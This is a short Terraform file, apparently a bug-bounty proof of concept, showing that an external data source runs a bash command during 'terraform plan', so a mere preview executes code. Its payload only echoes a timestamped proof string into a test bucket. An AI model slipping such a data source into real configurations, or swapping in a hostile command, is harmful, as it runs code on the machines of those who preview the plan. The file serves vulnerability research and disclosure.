# This Terraform code exploits the fact that `terraform plan` 
# executes external data sources and provisioners.
# Even a PREVIEW (plan-only) can execute arbitrary code.

terraform {
  required_version = ">= 1.2.0"
  required_providers {
    google = {
      source  = "hashicorp/google"
      version = ">= 4.0"
    }
  }
}

variable "project_id" {
  type    = string
  default = "ellison-hunt-1102-c86d"
}

# ATTACK: external data source executes during `terraform plan`
data "external" "rce_proof" {
  program = ["bash", "-c", "echo '{\"proof\": \"PLAN_PHASE_RCE_'$(date +%s)'\"}'"]
}

resource "google_storage_bucket_object" "deployment_marker" {
  name    = "im-pr-toctou-test/deploy-marker.txt"
  bucket  = "ellison-hunt-1102-c86d-vrp-test"
  content = "PREVIEW_EVIL_${data.external.rce_proof.result.proof}"
}

output "rce_proof" {
  value = data.external.rce_proof.result.proof
}
